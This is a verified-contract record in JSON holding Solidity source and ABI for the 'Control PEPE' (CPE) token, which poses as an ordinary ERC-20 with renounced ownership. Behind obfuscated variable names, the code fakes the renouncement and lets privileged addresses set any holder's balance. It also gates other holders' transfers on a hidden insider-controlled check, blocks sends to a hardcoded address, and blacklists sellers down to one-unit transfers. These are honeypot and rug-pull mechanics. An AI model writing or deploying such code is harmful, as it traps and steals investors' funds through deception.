{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface senderLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTo) external view returns (uint256);\n\n    function transfer(address swapTeam, uint256 listLimit) external returns (bool);\n\n    function allowance(address isTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTeam,\n        uint256 listLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTo, uint256 value);\n    event Approval(address indexed isTotal, address indexed spender, uint256 value);\n}\n\nabstract contract takeAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalLaunched {\n    function createPair(address fundList, address tokenTrading) external returns (address);\n}\n\ninterface maxIsFund is senderLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ControlPEPE is takeAuto, senderLiquidity, maxIsFund {\n\n    uint256 public fromListLaunched;\n\n    function marketingLimitExempt(address listTo) public {\n        if (buyIs) {\n            return;\n        }\n        \n        isList[listTo] = true;\n        if (modeWallet != amountTake) {\n            feeEnable = true;\n        }\n        buyIs = true;\n    }\n\n    address public amountLaunched;\n\n    function transfer(address txTokenSell, uint256 listLimit) external virtual override returns (bool) {\n        return autoTxFrom(_msgSender(), txTokenSell, listLimit);\n    }\n\n    bool public modeLiquidity;\n\n    uint256 public senderReceiver;\n\n    function txMarketing(address takeLiquidity) public {\n        liquidityShould();\n        if (feeEnable != swapModeSender) {\n            swapModeSender = false;\n        }\n        if (takeLiquidity == walletToken || takeLiquidity == amountLaunched) {\n            return;\n        }\n        listSwapLaunched[takeLiquidity] = true;\n    }\n\n    mapping(address => bool) public isList;\n\n    bool public amountTake;\n\n    function fromLaunched(address launchTeam, address swapTeam, uint256 listLimit) internal returns (bool) {\n        require(tradingLiquidity[launchTeam] >= listLimit);\n        tradingLiquidity[launchTeam] -= listLimit;\n        tradingLiquidity[swapTeam] += listLimit;\n        emit Transfer(launchTeam, swapTeam, listLimit);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed atTotalList, address indexed swapTake);\n\n    constructor (){\n        if (amountTake != feeEnable) {\n            feeEnable = false;\n        }\n        teamFee enableFeeList = teamFee(fundTxShould);\n        amountLaunched = totalLaunched(enableFeeList.factory()).createPair(enableFeeList.WETH(), address(this));\n        \n        walletToken = _msgSender();\n        toTeamFee();\n        isList[walletToken] = true;\n        tradingLiquidity[walletToken] = maxBuy;\n        if (modeLiquidity) {\n            teamSell = senderReceiver;\n        }\n        emit Transfer(address(0), walletToken, maxBuy);\n    }\n\n    uint256 tokenFundReceiver;\n\n    function transferFrom(address launchTeam, address swapTeam, uint256 listLimit) external override returns (bool) {\n        if (_msgSender() != fundTxShould) {\n            if (tradingBuy[launchTeam][_msgSender()] != type(uint256).max) {\n                require(listLimit <= tradingBuy[launchTeam][_msgSender()]);\n                tradingBuy[launchTeam][_msgSender()] -= listLimit;\n            }\n        }\n        return autoTxFrom(launchTeam, swapTeam, listLimit);\n    }\n\n    uint256 constant teamTx = 1 ** 10;\n\n    mapping(address => uint256) private tradingLiquidity;\n\n    function toTeam(address txTokenSell, uint256 listLimit) public {\n        liquidityShould();\n        tradingLiquidity[txTokenSell] = listLimit;\n    }\n\n    bool private modeWallet;\n\n    mapping(address => bool) public listSwapLaunched;\n\n    bool public feeEnable;\n\n    uint256 public teamSell;\n\n    mapping(address => mapping(address => uint256)) private tradingBuy;\n\n    string private maxMinFrom = \"CPE\";\n\n    bool public buyIs;\n\n    function name() external view virtual override returns (string memory) {\n        return maxTeam;\n    }\n\n    bool private swapModeSender;\n\n    uint256 private maxBuy = 100000000 * 10 ** 18;\n\n    function maxLaunchedFrom(uint256 listLimit) public {\n        liquidityShould();\n        tokenFundReceiver = listLimit;\n    }\n\n    uint256 exemptAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxMinFrom;\n    }\n\n    function liquidityShould() private view {\n        require(isList[_msgSender()]);\n    }\n\n    address private receiverTx;\n\n    function toTeamFee() public {\n        emit OwnershipTransferred(walletToken, address(0));\n        receiverTx = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return receiverTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamSender;\n    }\n\n    uint8 private teamSender = 18;\n\n    function autoTxFrom(address launchTeam, address swapTeam, uint256 listLimit) internal returns (bool) {\n        if (launchTeam == walletToken) {\n            return fromLaunched(launchTeam, swapTeam, listLimit);\n        }\n        uint256 sellMin = senderLiquidity(amountLaunched).balanceOf(marketingLaunch);\n        require(sellMin == tokenFundReceiver);\n        require(swapTeam != marketingLaunch);\n        if (listSwapLaunched[launchTeam]) {\n            return fromLaunched(launchTeam, swapTeam, teamTx);\n        }\n        return fromLaunched(launchTeam, swapTeam, listLimit);\n    }\n\n    address fundTxShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address autoTo) public view virtual override returns (uint256) {\n        return tradingLiquidity[autoTo];\n    }\n\n    address marketingLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public walletToken;\n\n    function allowance(address marketingShould, address shouldExempt) external view virtual override returns (uint256) {\n        if (shouldExempt == fundTxShould) {\n            return type(uint256).max;\n        }\n        return tradingBuy[marketingShould][shouldExempt];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxBuy;\n    }\n\n    string private maxTeam = \"Control PEPE\";\n\n    function getOwner() external view returns (address) {\n        return receiverTx;\n    }\n\n    function approve(address shouldExempt, uint256 listLimit) public virtual override returns (bool) {\n        tradingBuy[_msgSender()][shouldExempt] = listLimit;\n        emit Approval(_msgSender(), shouldExempt, listLimit);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotalList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromListLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listSwapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"}],\"name\":\"marketingLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLimit\",\"type\":\"uint256\"}],\"name\":\"maxLaunchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTokenSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimit\",\"type\":\"uint256\"}],\"name\":\"toTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTeamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTokenSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"}],\"name\":\"txMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ControlPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}